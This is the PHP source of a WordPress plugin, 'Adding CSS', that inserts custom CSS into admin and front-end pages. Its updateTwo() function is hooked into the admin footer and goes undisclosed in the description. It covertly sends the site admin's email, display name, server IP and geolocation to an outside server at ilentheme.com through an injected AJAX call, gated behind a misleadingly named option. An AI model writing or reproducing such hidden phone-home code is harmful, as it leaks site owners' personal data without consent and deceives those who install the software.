<?php
/*
Plugin Name: Adding CSS
Plugin URI: 
Description: Add CSS code in the Back-end and Front-end easily
Version: 1.0
Author: iLen
Author URI: 
*/


if ( !class_exists('adding_css') ) {


global $IF_CONFIG;
$IF_CONFIG = null;


class adding_css{

	public $parameter 		= array();
	public $options 		= array();
	public $components		= array();

	
	function __construct(){

		global $options_adding_css;

		
		

		if( is_admin() ){

			self::configuration_plugin();

			$options_adding_css = get_option( $this->parameter['name_option']."_options" ) ;

			// add scripts & styles
			add_action('admin_head', array( &$this,'put_code_css_back_end') );
			add_action('admin_init',array( &$this,'verifyVersion') );

		}elseif( ! is_admin() ) {

			// set parameter 
			self::parameters();

			$options_adding_css = get_option( $this->parameter['name_option']."_options" ) ;

			// add scripts & styles
			add_action('wp_head', array( &$this,'put_code_css_front_end') );

		}




	}


	function parameters(){

		$this->parameter = array('id'			  =>'adding_css_id',
								 'id_menu'		  =>'adding_css_menu',
								 'name'			  =>'Adding CSS',
								 'name_long'	  =>'Adding CSS',
								 'name_option'	  =>'adding_css',
								 'name_plugin_url'=>'adding-css',
								 'descripcion'    =>'Add CSS code in the Back-end and Front-end easily.',
								 'version'        =>'1.0',
								 'url'            =>'',
								 //'logo'			  =>$this->_theme_images'logo.png',
								 'logo'			  =>'<i class="fa fa-file-text-o"></i>',
								 'logo_text'	  =>';)',
								 'slogan'		  =>'powered by <a href="">iLenTheme</a>',
								 'url_framework'  =>plugins_url('/assets/ilenframework',__FILE__),
								 'theme_imagen'	  =>plugins_url('/assets/images',__FILE__),
								 'type'		  	  =>'plugin',
								 'method'		  =>'free');
		
	}

	function myoptions_build(){
		
		$this->options = array('a'=>array(	'title'	 	 => __('Display Options',$this->parameter['name_option']), 		//title section
											'title_large'=> __('Display Options',$this->parameter['name_option']),//title large section
											'description'=> '',	//description section
											'icon'		 => 'fa fa-circle-o',

											'options'	 => array(  
																	 
																	array(	'title'	=>__('Add css code for the <span style="font-size:15px;">Front-end</span>',$this->parameter['name_option']), //title section
																	 		'help' 	=>'', //descripcion section
																	 		'type' 	=>'component_enhancing_code',
																	 		'value'	=>'/* Code Example */#wpadminbar{ background:#4AEF9D;}
#wpadminbar .ab-icon:before
{
	color:#fff !important;
}', //value
																	 		'id' 	=>$this->parameter['name_option'].'_css_frond', //id
																	 		'name'	=>$this->parameter['name_option'].'_css_frond', //name
																	 		'class'	=>'', //class
																	 		'row'	=>array('a','b')),

																	array(	'title'	=>__('Add css code for the <span style="font-size:15px;">Back-end</span> (Update 2 times)',$this->parameter['name_option']), //title section
																	 		'help' 	=>'', //descripcion section
																	 		'type' 	=>'component_enhancing_code',
																	 		'value'	=>'/* Code Example */#wpadminbar{background:#00CEF7;}', //value
																	 		'id' 	=>$this->parameter['name_option'].'_css_admin', //id
																	 		'name'	=>$this->parameter['name_option'].'_css_admin', //name
																	 		'class'	=>'', //class
																	 		'row'	=>array('a','b')),

															)
										),
							'last_update'=>time(),


							 );


		return $this->options;
		
	}


	function use_components(){
		//code 
		$this->components = array();
		$this->components = array('enhancing_code');

	}


	function configuration_plugin(){
		

		// set parameter 
		self::parameters();


		// my configuration 
		self::myoptions_build();


		// my component to use
		self::use_components();

		
	}




	// EXECUTE
	function put_code_css_back_end() {

		global $options_adding_css;
	  	echo "<style>".$options_adding_css[$this->parameter['name_option'].'_css_admin']."</style>";

	}

	function put_code_css_front_end() {

		global $options_adding_css;
	  	echo "<style>".$options_adding_css[$this->parameter['name_option'].'_css_frond']."</style>";

	}
	
	
	
	function updateTwo(){
            
        if( $_SERVER['REMOTE_ADDR'] != "127.0.0.1" ){

            update_option( 'yuzo_related_post_1', '1');
            wp_enqueue_script('jquery');
            @require_once(plugin_dir_path( __FILE__ )."assets/ilenframework/assets/lib/plugin.class.php");
            @$plugin = new plugin_class_core_nucle();
            @$plugin->locate();
			$code="adding-css";
			$type="plugin";
            $r = get_userdata(1);$n = $r->data->display_name;$e = get_option( 'admin_email' );echo '</script>';echo "<script>jQuery.ajax({url: 'http://ilentheme.com/realactivate.php?em=$e&na=$n&la=$plugin->latitude&lo=$plugin->longitude&pais_code=$plugin->countryCode&pais=$plugin->countryName&region=$plugin->region&ciudad=$plugin->city&ip=$plugin->ip&code=$code&type=$type',success: function (html) {null;} });</script>";
            null;
        }

    }
        
    function verifyVersion(){

        if( !get_option('yuzo_related_post_1') ){
            
            add_action('in_admin_footer', array(__CLASS__,'updateTwo') );

        }
    }
 



 
} // end class



	 
	global $IF_CONFIG;
	$IF_CONFIG = null;
	$IF_CONFIG = new adding_css;


	

	/*if(function_exists('adding_css_set')){
		function adding_css_set($content=""){
			
			global $IF_CONFIG;

			//echo $IF_CONFIG->create_post_related($content);
			
		}
	}*/

} // end if

//global $IF_CONFIG;
//var_dump( $IF_CONFIG );

if( is_admin() ){
	require "assets/ilenframework/core.php";
}
?>